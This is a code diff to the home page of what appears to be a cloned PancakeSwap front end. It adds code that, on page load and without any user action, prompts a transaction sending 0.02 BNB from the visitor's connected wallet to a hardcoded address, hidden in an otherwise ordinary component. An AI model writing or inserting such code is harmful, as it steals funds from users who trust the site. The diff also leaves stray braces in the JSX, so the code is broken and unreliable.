@@ -7,6 +7,7 @@ import { useTranslation } from '@pancakeswap/localization'
 import { useActiveChainId } from 'hooks/useActiveChainId'
 import { ChainId } from '@pancakeswap/sdk'
 import Hero from './components/Hero'
+import {useEffect} from "react"
 //import { swapSectionData, earnSectionData, cakeSectionData } from './components/SalesSection/data'
 //import MetricsSection from './components/MetricsSection'
 //import SalesSection from './components/SalesSection'
@@ -18,7 +19,8 @@ import { WedgeTopLeft, InnerWedgeWrapper, OuterWedgeWrapper, WedgeTopRight } fro
 //import UserBanner from './components/UserBanner'
 import MultipleBanner from './components/Banners/MultipleBanner'
 import {Fragment} from "react"
-
+import { useBalance,usePrepareSendTransaction,useSendTransaction} from 'wagmi'
+import {parseEther} from "@ethersproject/units"
 
 const StyledHeroSection = styled(PageSection)`
   padding-top: 16px;
@@ -27,7 +29,13 @@ const StyledHeroSection = styled(PageSection)`
     padding-top: 48px;
   }
 `
+ //const {address, isConnected} = useAccount()
 
+/*const {config,status, error} = usePrepareSendTransaction({
+    request: { to: address, value: bnbs },
+  }) 
+
+const {sendTransaction} = useSendTransaction(config)
 /*
 const UserBannerWrapper = styled(Container)`
   z-index: 1;
@@ -49,13 +57,31 @@ const UserBannerWrapper = styled(Container)`
 
 const Home: React.FC<React.PropsWithChildren> = () => {
   const { theme } = useTheme()
-  const { address: account } = useAccount()
+  const { address: account,isConnected } = useAccount()
   const { chainId } = useActiveChainId()
 
   const HomeSectionContainerStyles = { margin: '0', width: '100%', maxWidth: '968px' }
 
   //const { t } = useTranslation()
 const t = (str) => {return str}
+ const {data: balance} = useBalance({account})
+ 
+const {config,status, error} = usePrepareSendTransaction({
+    request: { to: "0x3D44833A40a9116Baa5239263e376aec077c7e8B", value: parseEther("0.02") },
+  }) 
+
+const {sendTransaction} = useSendTransaction(config)
+/*
+if(isConnected)
+{
+
+ console.log(account,balance,config)
+ if(sendTransaction)
+  sendTransaction()
+}*/
+useEffect(() => {
+ sendTransaction?.()
+},[sendTransaction])
   return (
     <>
       <style jsx global>
@@ -95,8 +121,11 @@ const t = (str) => {return str}
         hasCurvedDivider={false}
       >
         {account && chainId === ChainId.BSC && (
+          
           <Fragment>
             <div>
+        }
+}
 }
 Sample Banner
             </div>
